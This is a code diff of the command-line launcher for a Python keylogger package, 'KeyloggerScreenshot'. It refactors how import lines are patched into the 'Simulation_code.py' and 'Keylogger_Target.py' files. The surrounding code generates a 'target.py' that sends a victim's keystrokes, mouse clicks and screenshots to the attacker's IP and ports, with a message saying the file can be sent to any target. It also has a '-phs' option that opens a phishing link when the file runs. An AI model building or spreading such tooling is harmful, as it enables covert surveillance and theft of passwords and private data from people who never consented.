@@ -1,16 +1,56 @@
 import os
+
+files = ["Simulation_code.py", "Keylogger_Target.py"]
+
+
+def get_data(file):
+    os.chdir("KeyloggerScreenshot")
+    with open(file, "r+") as open_file:
+        data = [line.replace("\n", "") for line in open_file]
+        return data
+
+
+def write_data(filename, actual_data):
+    sim_lst = []
+    key_lst = []
+    sim = False
+    key = False
+
+    if filename == "Simulation_code.py":
+        sim = True
+        sim_lst = ["import PIL.Image", "import pyautogui as pg", "import tkinter as tk"]
+    if filename == "Keylogger_Target.py":
+        key = True
+        key_lst = ["from pynput import keyboard", "from pynput.mouse import Listener", "import pyautogui as pg"]
+
+    for x in range(3):
+        if sim:
+            for every_sim in sim_lst:
+                actual_data.insert(0, every_sim)
+        if key:
+            for every_key in key_lst:
+                actual_data.insert(0, every_key)
+
+    with open(filename, "w+") as actual_file:
+        for each_data in actual_data:
+            actual_file.write(f"{each_data}\n")
+    os.chdir("..")
+
+
 try:
     import pyautogui as pg
+    os.chdir("KeyloggerScreenshot")
+    for every_file in files:
+        data_file = get_data(every_file)
+
+        write_data(every_file, data_file)
 
 except:
-    files = ["Simulation_code.py","Server_keylogger.py", "Keylogger_Target.py"]
     for this_file in files:
-        os.chdir("KeyloggerScreenshot")
-        with open(this_file, "r+") as file:
-            data = [line.replace("\n", "") for line in file]
+        this_data = get_data(this_file)
 
         with open(this_file, "w+") as file:
-            for each in data:
+            for each in this_data:
                 if each not in ["import PIL.Image", "from pynput import keyboard", "from pynput.mouse import Listener",
                                 "import tkinter as tk", "import pyautogui as pg"]:
                     file.write(f"{each}\n")
@@ -167,7 +207,8 @@ threading_server4.start() '''
                 try:
                     if "-cf" not in lst:
                         print(gui)
-                        print('YOU HAVE NOT CREATED A FILE. IF YOU NEED HELP SIMPLY TYPE "python KLS_start.py -help" IN YOUR TERMINAL')
+                        print(
+                            'YOU HAVE NOT CREATED A FILE. IF YOU NEED HELP SIMPLY TYPE "python KLS_start.py -help" IN YOUR TERMINAL')
                         sys.exit()
                     if "-" in lst[idx_s + 1]:
                         print(gui)
@@ -186,7 +227,6 @@ threading_server4.start() '''
                 seconds = 60
 
             if "-phs" in lst:
-                global phishing_name
                 phishing_name = None
                 try:
                     phs_idx = lst.index("-phs")
@@ -231,15 +271,18 @@ threading_server4.start() '''
                     if os.path.exists(filename):
                         os.remove(filename)
 
-                    if phishing_name is not None: print(f'LINK: {phishing_name} WILL BE OPEND WHEN {filename} IS EXECUTED')
+                    if phishing_name is not None: print(
+                        f'LINK: {phishing_name} WILL BE OPEND WHEN {filename} IS EXECUTED')
 
                     with open(f"{filename}", "a+") as file:
-                        file.write(f"import KeyloggerScreenshot as ks \n\nip = '{ipaddress}'\nkey_client = ks.KeyloggerTarget(ip, {port_photos}, ip, {port_keylogger}, ip, {port_listener}, ip, {port_time}, duration_in_seconds={seconds}, phishing_web={phishing_value}) \nkey_client.start()\n")
+                        file.write(
+                            f"import KeyloggerScreenshot as ks \n\nip = '{ipaddress}'\nkey_client = ks.KeyloggerTarget(ip, {port_photos}, ip, {port_keylogger}, ip, {port_listener}, ip, {port_time}, duration_in_seconds={seconds}, phishing_web={phishing_value}) \nkey_client.start()\n")
                     print(f"{filename.upper()} has been created")
 
                 except IndexError:
                     with open("target.py", "a+") as file:
-                        file.write(f"import KeyloggerScreenshot as ks \n\nip = '{ipaddress}'\nkey_client = ks.KeyloggerTarget(ip, {port_photos}, ip, {port_keylogger}, ip, {port_listener}, ip, {port_time}, duration_in_seconds={seconds}, phishing_web={phishing_value}) \nkey_client.start()\n")
+                        file.write(
+                            f"import KeyloggerScreenshot as ks \n\nip = '{ipaddress}'\nkey_client = ks.KeyloggerTarget(ip, {port_photos}, ip, {port_keylogger}, ip, {port_listener}, ip, {port_time}, duration_in_seconds={seconds}, phishing_web={phishing_value}) \nkey_client.start()\n")
                     print("TARGET.PY HAS BEEN CREATED YOU CAN SEND THIS TO YOUR TARGET")
 
             server_photos = ks.ServerPhotos(ipaddress, port_photos)
@@ -277,4 +320,5 @@ threading_server4.start() '''
             "\n-aip INSERT THE SERVERS IP\n-s   SPECIFY YOUR SECONDS (DEFAULT 60 SECONDS)\n-cf  CREATES TARGET FILE WHICH YOU SEND TO ANY TARGET\n-p   SAVES ALL THE PORTS OF THE CURRENT SERVER\n-ds  CREATES A SERVER WITH THE SAME PORTS AS THE TARGET\n-sim ACTIVATES SIMULATION\n-phs OPENS A LINK WHEN THE KEYLOGGER IS EXECUTED\n\n\nIF 'Simulation_code.py' IS IN YOUR DIRECTORY YOU CAN SIMULATE THE CLICKS THE TARGET HAS MADE IF IT HASN'T WORKD ON THE ACTUAL CODE")
 
 except OSError:
-    print('CHECK YOUR IP-ADDRESS WITH "ipconfig" ON WINDOWS AND "ifconfig" ON LINUX\n\nIF YOU HAVE THE CORRECT IP ADDRESSS AND IT STILL DOESNT WORK YOU CAN MODIFY YOUR IP ON "keylogger_server.py" AND "keylogger_target.py".\nAFTER THAT YOU CAN SEND THE TARGET OBVIOUSLY THE FILE "keylogger_target.py"')
+    print(
+        'CHECK YOUR IP-ADDRESS WITH "ipconfig" ON WINDOWS AND "ifconfig" ON LINUX\n\nIF YOU HAVE THE CORRECT IP ADDRESSS AND IT STILL DOESNT WORK YOU CAN MODIFY YOUR IP ON "keylogger_server.py" AND "keylogger_target.py".\nAFTER THAT YOU CAN SEND THE TARGET OBVIOUSLY THE FILE "keylogger_target.py"')
